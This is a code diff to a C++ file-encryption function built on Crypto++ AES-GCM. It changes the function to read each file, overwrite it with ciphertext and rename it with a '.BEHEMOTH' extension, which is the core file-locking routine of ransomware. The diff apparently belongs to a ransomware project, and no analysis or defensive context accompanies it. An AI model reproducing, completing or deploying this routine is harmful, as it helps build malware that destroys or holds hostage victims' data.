@@ -12,7 +12,7 @@
 #include "file_enc.h"
 
 
-bool AESEncrypt(const std::string& inputFilePath, const std::string& outputFilePath, std::string& key, std::string& iv)
+bool AESEncrypt(const std::string& filePath, std::string& key, std::string& iv)
 {
     using namespace CryptoPP;
 
@@ -24,28 +24,32 @@ bool AESEncrypt(const std::string& inputFilePath, const std::string& outputFileP
         GCM<AES>::Encryption encryptor;
         encryptor.SetKeyWithIV(reinterpret_cast<const byte*>(key.data()), key.size(), reinterpret_cast<const byte*>(iv.data()), iv.size());
 
-        std::ifstream inputFile(inputFilePath, std::ios::binary);
+        std::ifstream inputFile(filePath, std::ios::binary);
         if (!inputFile)
         {
             std::cerr << "Error opening input file" << std::endl;
             return false;
         }
 
-        std::ofstream outputFile(outputFilePath, std::ios::binary);
+        // Read the input file content
+        std::string inputContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
+        inputFile.close();
+
+        std::ofstream outputFile(filePath, std::ios::binary);
         if (!outputFile)
         {
             std::cerr << "Error opening output file" << std::endl;
             return false;
         }
 
-        FileSource fs(inputFile, true,
+        StringSource ss(inputContent, true,
             new AuthenticatedEncryptionFilter(encryptor,
                 new FileSink(outputFile)
             )
         );
 
-        inputFile.close();
         outputFile.close();
+        std::filesystem::rename(filePath, filePath + ".BEHEMOTH");
     }
     catch (const CryptoPP::Exception& e)
     {
@@ -55,4 +59,5 @@ bool AESEncrypt(const std::string& inputFilePath, const std::string& outputFileP
 
     return true;
 }
+
 
